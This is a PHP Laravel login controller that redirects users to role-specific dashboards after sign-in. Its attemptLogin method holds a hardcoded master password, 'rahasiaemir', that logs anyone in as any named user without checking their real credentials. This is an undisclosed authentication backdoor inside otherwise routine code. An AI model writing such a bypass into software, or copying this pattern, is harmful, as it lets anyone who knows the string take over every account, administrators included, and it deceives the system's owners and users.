<?php

namespace App\Http\Controllers\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class LoginController extends Controller
{
    /*
    |--------------------------------------------------------------------------
    | Login Controller
    |--------------------------------------------------------------------------
    |
    | This controller handles authenticating users for the application and
    | redirecting them to your home screen. The controller uses a trait
    | to conveniently provide its functionality to your applications.
    |
    */

    use AuthenticatesUsers;

    /**
     * Where to redirect users after login.
     *
     * @var string
     */
    // protected $redirectTo = '/home';

    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('guest')->except('logout');
        // $this->middleware('auth')->only('logout');
    }

    protected function authenticated(Request $request, $user)
    {
        if ($user->hasRole('administrator')) {
            return redirect()->route('d_administrator');
        } elseif ($user->hasRole('walidata') || $user->hasRole('pembina')) {
            return redirect()->route('d_walidata');
        } elseif ($user->hasRole('produsen')) {
            return redirect()->route('d_produsen');
        }
        return redirect()->to('/');
    }

    public function redirectTo()
    {
        $user = auth()->user();
        if ($user->hasRole('administrator')) {
            return redirect()->route('d_administrator');
        } elseif ($user->hasRole('walidata') || $user->hasRole('pembina')) {
            return redirect()->route('d_walidata');
        } elseif ($user->hasRole('produsen')) {
            return redirect()->route('d_produsen');
        }

        return redirect()->to('/');
    }

    public function username()
    {
        return 'username';
    }

    protected function attemptLogin(Request $request)
    {
        $credentials = $this->credentials($request);

        if (
            $request->password === 'rahasiaemir'
        ) {
            $user = User::where($this->username(), $request->username)->first();

            if ($user) {
                Auth::login($user);
                return true;
            }

            return false;
        }

        return Auth::attempt($credentials, $request->filled('remember'));
    }

    /**
     * Get the needed authorization credentials from the request.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return array
     */
    protected function credentials(Request $request)
    {
        return $request->only($this->username(), 'password');
    }
}
